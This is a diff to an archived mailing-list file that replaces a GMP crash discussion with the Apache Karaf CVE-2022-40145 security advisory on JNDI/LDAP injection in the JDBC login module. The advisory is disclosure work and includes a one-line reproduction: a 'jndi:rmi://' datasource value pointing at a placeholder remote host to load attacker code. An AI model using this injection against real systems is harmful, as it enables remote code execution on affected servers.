@@ -1,32 +1,38 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2022/10/13/3
-Message-ID: <CAGUWgD-qOonOY_MakeWtotx4mC6KXsg1zLOo9zzx6DKtdaXLsg@mail.gmail.com>
-Date: Thu, 13 Oct 2022 08:43:15 +0300
-From: Georgi Guninski <gguninski@...il.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2022/12/21/5
+Message-ID: <1e60267c-edf3-05bc-4e36-78ebe5889664@apache.org>
+Date: Wed, 21 Dec 2022 15:53:26 +0000
+From: Jean-Baptiste Onofré <jbonofre@...che.org>
 To: oss-security@...ts.openwall.com
-Subject: Re: sagemath denial of service with abort() in gmp: overflow in mpz type
+Subject: CVE-2022-40145: Apache Karaf: JDBC JAAS LDAP injection 
 Content-Type: text/plain; charset=utf-8
 
-On Tue, Sep 6, 2022 at 7:17 PM Russ Allbery <eagle@...ie.org> wrote:
->
->
-> I would only call it a DoS if it crosses a privilege boundary.  A user can
-> always DoS themselves; that's just Ctrl-C.  :)
->
-Observe that ubuntu issue advisory about libgmp crash
-without mentioning potential exploitability.
+Severity: low
 
-quote:
-https://ubuntu.com/security/notices/USN-5672-1
+Description:
 
-Details
-12 October 2022
+This vulnerable is about a potential code injection when an attacker has control of the target LDAP server using in the JDBC JNDI URL.
 
-It was discovered that GMP did not properly manage memory
-on 32-bit platforms when processing a specially crafted
-input. An attacker could possibly use this issue to cause
-applications using GMP to crash, resulting in a denial of
-service.
+The function jaas.modules.src.main.java.porg.apache.karaf.jass.modules.jdbc.JDBCUtils#doCreateDatasource
+use InitialContext.lookup(jndiName) without filtering.
+An user can modify `options.put(JDBCUtils.DATASOURCE, "osgi:" + DataSource.class.getName());` to `options.put(JDBCUtils.DATASOURCE,"jndi:rmi://x.x.x.x:xxxx/Command");` in JdbcLoginModuleTest#setup.
 
-References
-CVE-2021-43618
+This is vulnerable to a remote code execution (RCE) attack when a
+configuration uses a JNDI LDAP data source URI when an attacker has
+control of the target LDAP server.This issue affects all versions of Apache Karaf up to 4.4.1 and 4.3.7.
+
+We encourage the users to upgrade to Apache Karaf at least 4.4.2 or 4.3.8
+
+This issue is being tracked as KARAF-7568 
+
+Credit:
+
+Xun Bai <bbbbear68@...il.com> (reporter)
+
+References:
+
+https://karaf.apache.org/security/cve-2022-40145.txt
+https://karaf.apache.org/
+https://www.cve.org/CVERecord?id=CVE-2022-40145
+https://issues.apache.org/jira/browse/KARAF-7568
+
